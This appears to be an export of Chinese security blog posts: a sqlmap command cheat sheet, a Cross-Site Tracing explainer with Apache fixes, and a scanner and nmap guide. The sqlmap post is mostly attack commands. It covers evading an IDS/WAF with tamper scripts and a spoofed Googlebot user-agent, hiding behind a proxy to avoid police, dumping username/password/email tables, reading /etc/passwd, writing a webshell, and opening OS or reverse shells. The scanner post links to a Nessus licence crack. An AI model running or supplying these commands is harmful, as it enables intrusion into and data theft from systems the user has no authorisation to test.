<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">刚刚群里有个哥们发了个注入点，有IDS防火墙，请求过于频繁就会封杀IP</span><br><span class="line"></span><br><span class="line">有个思路，抛砖引玉，各位大牛请轻拍</span><br><span class="line"></span><br><span class="line">sqlmap.py --proxy http:&#x2F;&#x2F;127.0.0.1:8087 -u 你懂得 -v 3 –dbms “MySQL” --tamper “space2morehash.py” --referer“http:&#x2F;&#x2F;www.google.com” --user-agent &quot;Googlebot&#x2F;2.1 (+http:&#x2F;&#x2F;www.googlebot.com&#x2F;bot.html）&quot;</span><br><span class="line"></span><br><span class="line">参数解释 ：</span><br><span class="line"></span><br><span class="line">--proxy &#x2F;&#x2F;这个是代理的IP，你不用代理不用VPN就不怕被查水表么。。。</span><br><span class="line"></span><br><span class="line">-u &#x2F;&#x2F;这个不懂的面壁去</span><br><span class="line"></span><br><span class="line">-v 3 &#x2F;&#x2F;这个是注入的详细级别1-5</span><br><span class="line"></span><br><span class="line">--dbms &quot;MySQL&quot; &#x2F;&#x2F;指定数据库</span><br><span class="line"></span><br><span class="line">--tamper “space2morehash.py” &#x2F;&#x2F;载入绕过WAF防火墙的脚本</span><br><span class="line"></span><br><span class="line">--referer“http:&#x2F;&#x2F;www.google.com” &#x2F;&#x2F;模拟来源，就是从哪个网页跳转过来的。如果不懂可以谷歌referer</span><br><span class="line"></span><br><span class="line">--user-agent &quot;Googlebot&#x2F;2.1 (+http:&#x2F;&#x2F;www.googlebot.com&#x2F;bot.html）&quot; 模拟谷歌蜘蛛，一般都不会限制蜘蛛爬网站。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">更多命令运用：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;wenku.baidu.com&#x2F;link?url&#x3D;eMzrblqUDfXDaosGNkAKnthsT4AA79BEgd5XUnD624yqefBbHaqZk-lVx3pns2M6tApuP7bbNYpPTHGBgiCxdutlUKFGtdmJj80usI2nBuS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap注入方式普及</span><br><span class="line"></span><br><span class="line">0.详细参数详解：http:&#x2F;&#x2F;pan.baidu.com&#x2F;share&#x2F;link?shareid&#x3D;503193&amp;uk&#x3D;3223979763</span><br><span class="line"></span><br><span class="line">1. 基础用法：</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u “注入地址” -v 1 --dbs &#x2F;&#x2F; 列举数据库</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u “注入地址” -v 1 --current-db &#x2F;&#x2F; 当前数据库</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u “注入地址” -v 1 --users &#x2F;&#x2F; 列数据库用户</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u “注入地址” -v 1 --current-user &#x2F;&#x2F; 当前用户</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u “注入地址” -v 1 --tables -D “数据库” &#x2F;&#x2F; 列举数据库的表名</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u “注入地址” -v 1 --columns -T “表名” -D “数据库” &#x2F;&#x2F; 获取表的列名</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u “注入地址” -v 1 --dump -C “字段,字段” -T “表名” -D “数据库” &#x2F;&#x2F; 获取表中的数据，包含列</span><br><span class="line"></span><br><span class="line">已经开始拖库了，SQLMAP是非常人性化的，它会将获取的数据存储sqlmap&#x2F;output&#x2F;中、、、</span><br><span class="line"></span><br><span class="line">2. sqlmap post注入</span><br><span class="line"></span><br><span class="line">我们在使用Sqlmap进行post型注入时，</span><br><span class="line"></span><br><span class="line">经常会出现请求遗漏导致注入失败的情况。</span><br><span class="line"></span><br><span class="line">这里分享一个小技巧，即结合burpsuite来使用sqlmap，</span><br><span class="line"></span><br><span class="line">用这种方法进行post注入测试会更准确，操作起来也非常容易。</span><br><span class="line"></span><br><span class="line">1. 浏览器打开目标地址http:&#x2F;&#x2F; www.2cto.com &#x2F;Login.asp</span><br><span class="line"></span><br><span class="line">2. 配置burp代理(127.0.0.1:8080)以拦截请求</span><br><span class="line"></span><br><span class="line">3. 点击login表单的submit按钮</span><br><span class="line"></span><br><span class="line">4. 如下图，这时候Burp会拦截到了我们的登录POST请求</span><br><span class="line"></span><br><span class="line">5. 把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下</span><br><span class="line"></span><br><span class="line">6. 运行sqlmap并使用如下命令：</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -r search-test.txt -p tfUPass</span><br><span class="line"></span><br><span class="line">这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，</span><br><span class="line"></span><br><span class="line">而-p 大家应该比较熟悉，指定注入用的参数。</span><br><span class="line"></span><br><span class="line">3，sqlmap cookies注入</span><br><span class="line"></span><br><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;base.php&quot; --cookies &quot;id&#x3D;1&quot; --dbs --level 2</span><br><span class="line"></span><br><span class="line">2.默认情况下SQLMAP只支持GET&#x2F;POST参数的注入测试，但是当使用--level 参数且数值&gt;&#x3D;2的时候也会检查cookie时面的参数，当&gt;&#x3D;3的时候将检查User-agent和Referer，那么这就很简单了，我们直接在原有的基础上面加上 --level 2 即可</span><br><span class="line"></span><br><span class="line">利用sqlmap cookies注入突破用户登录继续注入</span><br><span class="line"></span><br><span class="line">先把用户登陆的cookie拿到吧，</span><br><span class="line"></span><br><span class="line">在收藏夹添加一个链接cookies属性：</span><br><span class="line"></span><br><span class="line">名字自己取</span><br><span class="line"></span><br><span class="line">javascript:alert(document.cookie)，，需要获取当前cookie的时候，</span><br><span class="line"></span><br><span class="line">直接点一下这个链接，然后复制一下弹出对话框</span><br><span class="line"></span><br><span class="line">里的cookie值就搞定了</span><br><span class="line"></span><br><span class="line">sqlmap.py -u http:&#x2F;&#x2F;x.x.x.x&#x2F;Down.aspx?tid&#x3D;2 -p tid --dbms mssql --cookie&#x3D;&quot;info&#x3D;username&#x3D;test&quot;</span><br><span class="line"></span><br><span class="line">-p是指指定参数注入</span><br><span class="line"></span><br><span class="line">4. sqlmap遇到url重写的注入</span><br><span class="line"></span><br><span class="line">哪里存在注入就加上 * 号</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u &quot;http:&#x2F;&#x2F;www.cunlide.com&#x2F;id1&#x2F;1*&#x2F;id2&#x2F;2&quot;</span><br><span class="line"></span><br><span class="line">5.sqlmap 编码绕waf注入</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 -v 3 –dbms “MySQL” –technique U -p id –batch –tamper &quot;space2morehash.py&quot;</span><br><span class="line"></span><br><span class="line">在sqlmap 的 tamper目录下有很多space2morehash.py 编码脚本自行加载</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap读文件</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--file-read “&#x2F;etc&#x2F;passwd&quot;</span><br><span class="line"></span><br><span class="line">sqlmap写文件</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--file-write &#x2F;localhost&#x2F;mm.php --file-dest&#x2F;var&#x2F;www&#x2F;html&#x2F;xx.php -v 2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap分段脱裤</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url -D &quot;data&quot; -T &quot;tables&quot; -C &quot;username,password,email&quot; --dump --threads&#x3D;5 --start&#x3D;1 --stop&#x3D;5000</span><br><span class="line"></span><br><span class="line">其他基础：</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot; --level&#x3D;3 --smart --dbms &quot;Mysql&quot; --current-user #获取当前用户名称</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;www.xxoo.com&#x2F;news?id&#x3D;1&quot; --level&#x3D;3 --smart --dbms &quot;Mysql&quot; --current-db #获取当前数据库名称</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;www.xxoo.com&#x2F;news?id&#x3D;1&quot; --level&#x3D;3 --smart --dbms &quot;Mysql&quot;--tables -D &quot;db_name&quot; #列表名</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot; --level&#x3D;3 --smart --dbms &quot;Mysql&quot; --columns -T &quot;tablename&quot; users-D &quot;db_name&quot; -v 0 #列字段</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot; --level&#x3D;3 --smart --dbms &quot;Mysql&quot; --dump -C &quot;column_name&quot; -T &quot;table_name&quot; -D &quot;db_name&quot; -v 0 #获取字段内容</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">******************信息获取******************</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --users #列数据库用户</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --dbs#列数据库</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--passwords #数据库用户密码</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--passwords-U root -v 0 #列出指定用户数据库密码</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --dump-all -v 0 #列出所有数据库所有表</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--privileges #查看权限</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--privileges -U root #查看指定用户权限</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --is-dba -v 1 #是否是数据库管理员</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --roles #枚举数据库用户角色</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--udf-inject #导入用户自定义函数（获取系统权限！）</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--dump-all --exclude-sysdbs -v 0 #列出当前库所有表</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --union-check #是否支持union 注入</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--union-cols #union 查询表记录</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --union-test #union 语句测试</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --union-use --banner #采用union 注入</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--union-test --union-tech orderby #union 配合 order by</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--method &quot;POST&quot; -- data &quot;id&#x3D;1&amp;cat&#x3D;2&quot; #post注入</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--cookie &quot;COOKIE_VALUE&quot; #cookie注入</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;-b #获取banner信息</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot; --level&#x3D;3 --smart-v 1 -f #指纹判别数据库类型</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot; --level&#x3D;3 --smart--proxy&quot;http:&#x2F;&#x2F;127.0.0.1:8118&quot; #代理注入</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--string&quot;STRING_ON_TRUE_PAGE&quot; #指定关键词</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--sql-shell #执行指定sql命令</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--os-cmd&#x3D;whoami #执行系统命令</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--os-shell #系统交互shell</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--os-pwn #反弹shell</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--reg-read #读取win系统注册表</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --dbs-o &quot;sqlmap.log&quot; #保存进度</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --dbs -o &quot;sqlmap.log&quot; --resume #恢复已保存进度</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u “http:&#x2F;&#x2F;www.91ri.org&#x2F; id1&#x2F;1*&#x2F;id2&#x2F;2″</span><br><span class="line"></span><br><span class="line">&quot;Show.asp&quot; --cookie &quot;id&#x3D;9&quot; --table --level 2</span><br><span class="line"></span><br><span class="line">--forms</span><br><span class="line"></span><br><span class="line">--data &quot;data&quot;</span><br><span class="line"></span><br><span class="line">--delay 0.5</span><br><span class="line"></span><br><span class="line">--safe-freq 25</span><br><span class="line"></span><br><span class="line">-v 3 --dbs --batch --tamper &quot;base64encode.py&quot;</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url -D &quot;data&quot; -T &quot;tables&quot; -C &quot;username,password,email&quot; --dump-all -v 0</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>跨站跟踪攻击</title>
    <url>/2019/07/15/%E8%B7%A8%E7%AB%99%E8%B7%9F%E8%B8%AA%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="跨站跟踪攻击-CST-XST"><a href="#跨站跟踪攻击-CST-XST" class="headerlink" title="[跨站跟踪攻击(CST/XST)]"></a>[跨站跟踪攻击(CST/XST)]</h1><p><strong>属于反射型，危害不大</strong></p>
<blockquote>
<p>跨站跟踪攻击即CST攻击，是一种利用XSS和HTTP TRACE功能来进行攻击的方式。<br>浏览器有一个安全策略，通过设置cookie的httponly属性，这样客户端脚本就不能通过document.cookie访问该cookie，即使有XSS漏洞，也不能盗取用户cookie。这个时候就可以利用HTTP TRACE方法来获取到用户的cookie信息。</p>
</blockquote>
<blockquote>
<p>TRACE作用：客户端发起一个请求时，这个请求可能要穿过防火墙、代理、网关或其他一些应用程序。每个中间节点都可能会修改原始的 HTTP 请求。TRACE 方法允许客户端在 最终将请求发送给服务器时，看看它变成了什么样子。</p>
</blockquote>
<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>1.burp抓包</p>
<p>2.修改get/post请求头为TRACE   //TRACE作用：客户端发起一个请求时，这个请求可能要穿过防火墙、代理、网关或其他一些应用程序。每个中间节点都可能会修改原始的 HTTP 请求。TRACE 方法允许客户端在 最终将请求发送给服务器时，看看它变成了什么样子。</p>
<p>3.修改请求包中的任意一个字段，例如Cookie字段，插入XSS代码，如下：<br>Cookie: <script>alert("TRACE XSS")</script></p>
<p>4.修改响应包中的显示类型<br>将Content-Type:message/http 改为 Content-Type:text/html Cookie<br>发送请求后页面就会弹出代码内容了</p>
<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>Apache服务器：</p>
<p>虚拟主机可以在.htaccess文件中添加如下代码过滤TRACE请求:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RewriteEngine on</span><br><span class="line">RewriteCond %&#123;REQUEST_METHOD&#125; ^(TRACE|TRACK)</span><br><span class="line">RewriteRule .* - [F]</span><br></pre></td></tr></table></figure>

<p>服务器用户在httpd.conf尾部添加如下指令后，重启apache即可:<br>TraceEnable off</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>扫描器</title>
    <url>/2019/05/20/%E6%89%AB%E6%8F%8F%E5%99%A8/</url>
    <content><![CDATA[<h1 id="总结图"><a href="#总结图" class="headerlink" title="总结图"></a>总结图</h1><p><img src="/image/%E6%89%AB%E6%8F%8F.png"></p>
<h1 id="👺国外各web与系统漏洞扫描器优缺点"><a href="#👺国外各web与系统漏洞扫描器优缺点" class="headerlink" title="👺国外各web与系统漏洞扫描器优缺点"></a><strong>👺国外各web与系统漏洞扫描器优缺点</strong></h1><p><strong>🦄AWVS</strong></p>
<p>漏洞扫描速度较快，准确率较高，漏洞规则库较为全面。漏洞验证可查看请求响应代码，但无中文界面。报表功能完整。有多重漏洞的验证工具。</p>
<p><strong>🦄Appscan</strong></p>
<p>漏洞扫描速度一般，准确率最高，漏洞规则库最全面。漏洞验证可查看请求相应代码，拥有较完整的漏洞修复建议。报表功能完整。全中文界面</p>
<p><strong>🦄H**</strong>P WebInspect**</p>
<p>漏洞扫描速度一般，准确率较高，扫描类型较多。报表功能强大。可查看请求响应代码。无中文界面。</p>
<p><strong>🦄WebCruiser</strong></p>
<p>此工具偏向渗透利用工具，扫描功能较弱。仅有轻量级SQL注入和XSS漏洞的扫描功能。具有SQL注入漏洞利用功能。</p>
<p><strong>🦄Nexpose</strong></p>
<p>扫描速度快，能扫描系统层和web层2类漏洞，但web漏洞发现能力不如appscan，系统扫描能力不如Nessus。</p>
<p><strong>🦄Nmap</strong></p>
<p>主要用于端口扫描和主机发现，不能实现web扫描和系统层扫描。对渗透测试起帮助作用。</p>
<p><strong>👺国内各web和系统漏洞扫描器优缺点</strong></p>
<p><strong>🦄杭州安恒</strong></p>
<p>漏洞扫描和事件监测是单一产品实现。漏洞扫描速度较慢；发现漏洞类型较多，结果准确。漏洞验证功能较好。综合展示界面直观；报表功能完整，支持任务结果多角度对比。支持开放接口。漏洞验证提供了快速验证，测试等功能，可查看请求响应代码，方便技术人员确认漏洞。但无法批量验证。</p>
<p><strong>🦄知道创宇</strong></p>
<p>漏洞扫描和事件监测是单一产品实现。漏洞扫描速度很快；发现漏洞类型关注高中风险，结果准确；能识别网站防护设备。支持漏洞验证。综合展示界面直观，有专用于展示的界面；报表功能完整；支持开放接口。</p>
<p><strong>🦄绿盟科技</strong></p>
<p>漏洞扫描和事件监测是两套产品实现。漏洞扫描速度较快；发现漏洞类型较多；结果准确。支持漏洞验证，支持批量验证。综合展示界面一般。报表功能较为完整，以任务为单位。支持开放接口。</p>
<p><strong>🦄安塞科技</strong></p>
<p>具备漏洞扫描，事件监测不完整，挂马监测需要确认。</p>
<p>漏洞扫描速度很快，发现漏洞类型较多，结果较为准确；支持漏洞验证；综合展示界面和报表功能较为简单。</p>
<p><strong>🦄国舜科技</strong></p>
<p>漏洞扫描和事件监测是单一产品实现。</p>
<p>漏洞扫描速度很快，发现漏洞类型较少，结果误差较大。不支持漏洞验证。综合展示界面直观，报表功能较为完整。</p>
<p><strong>🦄安域领创</strong></p>
<p>仅有漏洞扫描功能，无事件监测功能。</p>
<p>漏洞扫描速度很快，发现漏洞类型一般，结果较为准确；支持漏洞验证，不支持误报修正；综合展示和报表功能较为简单。支持开放接口。</p>
<p><strong>🦄启明星辰</strong></p>
<p>漏洞扫描不支持集群部署，不具备事件监测功能。</p>
<p>漏洞扫描速度一般，发现漏洞类型一般，结果准确性一般。不支持漏洞验证。</p>
<h1 id="👀nessus安装与使用"><a href="#👀nessus安装与使用" class="headerlink" title="👀nessus安装与使用"></a>👀nessus安装与使用</h1><p>下载地址<a href="https://links.jianshu.com/go?to=https://zh-cn.tenable.com/products/nessus?tns_redirect=true">https://zh-cn.tenable.com/products/nessus?tns_redirect=true</a></p>
<p><img src="/image/%E6%89%AB%E6%8F%8F%E5%99%A8/1.png"></p>
<h1 id="Nessus-v8-10系列并激活成无IP限制版本"><a href="#Nessus-v8-10系列并激活成无IP限制版本" class="headerlink" title="Nessus v8.10系列并激活成无IP限制版本"></a>Nessus v8.10系列并激活成无IP限制版本</h1><p>详细链接：<a href="https://www.jianshu.com/p/1d95550ffc81">https://www.jianshu.com/p/1d95550ffc81</a></p>
<h1 id="appscan使用"><a href="#appscan使用" class="headerlink" title="appscan使用"></a>appscan使用</h1><p><img src="/image/%E6%89%AB%E6%8F%8F%E5%99%A8/2.png"></p>
<h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><p><img src="/image/nmap.jpg"></p>
<h2 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h2><p>Nmap，也就是Network Mapper，中文为“网络映射器”。</p>
<p>Nmap是一款开源的网络探测和安全审核的工具，它的设计目标是快速地扫描大型网络。</p>
<p>它是网络管理员必用的软件之一，以及用以评估网络系统保安。</p>
<h3 id="1-1-基本功能"><a href="#1-1-基本功能" class="headerlink" title="1.1 基本功能"></a>1.1 基本功能</h3><p>（1）探测一组主机是否在线</p>
<p>（2）扫描主机端口，嗅探所提供的网络服务</p>
<p>（3）推断主机所用的操作系统</p>
<h3 id="1-2-工作原理"><a href="#1-2-工作原理" class="headerlink" title="1.2 工作原理"></a>1.2 工作原理</h3><p>Nmap对目标主机进行一系列的测试，利用测试结果建立相应目标主机的Nmap指纹，然后Nmap会对指纹进行匹配，最终输出相应的结果。</p>
<h3 id="1-3-语法格式"><a href="#1-3-语法格式" class="headerlink" title="1.3 语法格式"></a>1.3 语法格式</h3><p>Nmap的固定语法格式如下：</p>
<p>Nmap【空格】【选项|多选项|协议】【空格】【目标】</p>
<h2 id="0x02-常用参数"><a href="#0x02-常用参数" class="headerlink" title="0x02 常用参数"></a>0x02 常用参数</h2><p><img src="/image/%E6%89%AB%E6%8F%8F%E5%99%A8/5.jpg"></p>
<h3 id="2-1-全面扫描"><a href="#2-1-全面扫描" class="headerlink" title="2.1 全面扫描"></a>2.1 全面扫描</h3><p>全面扫描指定IP或域名的所有端口及其目标系统信息等。所需时间较长</p>
<p>nmap  -A  192.168.0.12</p>
<p>扫描结果：目标主机MAC地址、设备类型、操作系统、中央处理单元、主机详细资料、网络距离等</p>
<h3 id="2-2-简单扫描"><a href="#2-2-简单扫描" class="headerlink" title="2.2 简单扫描"></a>2.2 简单扫描</h3><p>该扫描方式可以针对IP或者域名进行扫描，扫描方式迅速，可以很方便地发现目    标端口的开放情况及主机在线情况。</p>
<p>nmap   192.168.0.12</p>
<p>简单扫描结果：（只能扫描工具规定的一些常见端口）</p>
<h3 id="2-3-其他举例"><a href="#2-3-其他举例" class="headerlink" title="2.3 其他举例"></a>2.3 其他举例</h3><p>指定扫描一个网段：nmap  192.168.0.0/24  或者  nmap  192.168.0.1-200（扫描1-200的主机）</p>
<p>扫描部分网段（逗号隔开）：nmap  192.168.0.1,2,3,4 或 nmap 192.168.0,1,2,3,4.1</p>
<p>扫描指定IP所开放的端口：nmap -p 1-65535 -v 127.0.0.1</p>
<p>扫描C段存活主机：nmap 192.168.1.0/24</p>
<p>指定端口扫描：nmap -p 80,1433,22,1521 192.168.1.1</p>
<p>探测主机操作系统：nmap -O 192.168.1.1</p>
<p>全面的系统探测：nmap -v -A 192.168.1.1（Nmap默认扫描主机1000个高危端口）</p>
<p>穿透防火墙进行扫描：nmap -Pn -A 192.168.1.1（禁止用ping的）</p>
<p>使用脚本扫描Web敏感目录：nmap -p 80 –script=http-enum.nse 192.168.1.1</p>
<h2 id="0x03-主机发现"><a href="#0x03-主机发现" class="headerlink" title="0x03 主机发现"></a>0x03 主机发现</h2><p><img src="/image/%E6%89%AB%E6%8F%8F%E5%99%A8/6.jpg"></p>
<h3 id="3-1-Ping扫描"><a href="#3-1-Ping扫描" class="headerlink" title="3.1 Ping扫描"></a>3.1 Ping扫描</h3><p>Ping扫描只进行ping，然后显示出在线的主机。使用该选项扫描可以轻易获取目标信息而不会被轻易发现。</p>
<p>在默认情况下，Nmap会发送一个ICMP回声请求和一个TCP报文到目标端口。Ping扫描的优点是不会返回太多的信息影响对结果的分析，并且扫描方式高效。</p>
<p>nmap -sP 192.168.0.0/24</p>
<h3 id="3-2-无Ping扫描"><a href="#3-2-无Ping扫描" class="headerlink" title="3.2 无Ping扫描"></a>3.2 无Ping扫描</h3><p>无ping扫描通常用于防火墙禁止ping的情况下，它能确定正在运行的机器。</p>
<p>默认情况下，nmap只对正在运行的主机进行高强度的探测，如端口扫描，版本探测或者操作系统探测。</p>
<p>用-P0禁止主机发现会使nmap对每一个特定的目标IP地址进行所要求的扫描，这可以穿透防火墙，也可以避免被防火墙发现。</p>
<p>nmap -P0 192.168.0.12</p>
<h3 id="3-3-TCP-SYN-Ping-扫描"><a href="#3-3-TCP-SYN-Ping-扫描" class="headerlink" title="3.3 TCP SYN Ping 扫描"></a>3.3 TCP SYN Ping 扫描</h3><p>通常情况下，nmap默认是使用TCP ACK 和 ICMP Echo 请求对目标进行是否存活的响应，当目标主机的防火墙阻止这些请求时，可以使用TCP SYN Ping扫描来判断主机是否存活。</p>
<p>-PS 选项发送一个设置了SYN标志位的空TCP报文。默认端口为80。</p>
<p>但不同的端口也可以作为选项指定，甚至可以指定一个以逗号分隔的端口列表（如-PS22,23,25,80,115,3306,3389），在这种情况下，每个端口会被并发地扫描</p>
<p>nmap  -PS  -v  192.168.0.12</p>
<p>上面结果可得知Nmap是通过SYN/ACK和RST响应来对目标主机是否存活进行判断，但在特定情况下防火墙会丢弃RST包。</p>
<p>这时结果会不准确，我们需要指定一个端口或端口范围来避免这种情况。</p>
<p>nmap  -PS80,100-200  -v  192.168.0.12</p>
<h3 id="3-4-TCP-ACK-Ping-扫描"><a href="#3-4-TCP-ACK-Ping-扫描" class="headerlink" title="3.4 TCP ACK Ping 扫描"></a>3.4 TCP ACK Ping 扫描</h3><p>使用-PA选项可以进行TCP ACK Ping扫描，它与TCP SYN Ping扫描非常类似，区别在于设置的TCP标志位是ACK而不是SYN，使用这种方式扫描可以探测阻止SYN包或ICMP Echo请求的主机。</p>
<p>nmap  -PA  -v  192.168.0.12</p>
<p>同时使用-SP与-PA选项命令如下：</p>
<p>nmap  -PA  -PS  192.168.0.12</p>
<h3 id="3-5-UDP-Ping扫描"><a href="#3-5-UDP-Ping扫描" class="headerlink" title="3.5 UDP Ping扫描"></a>3.5 UDP Ping扫描</h3><p>使用UDP Ping扫描时Nmap会发送一个空UDP包到目标之间，如果目标主机相应则返回一个ICMP端口不可达错误，如果目标主机不是存活状态则会返回各自ICMP错误信息。</p>
<p>nmap  -PU  -v  192.168.0.12</p>
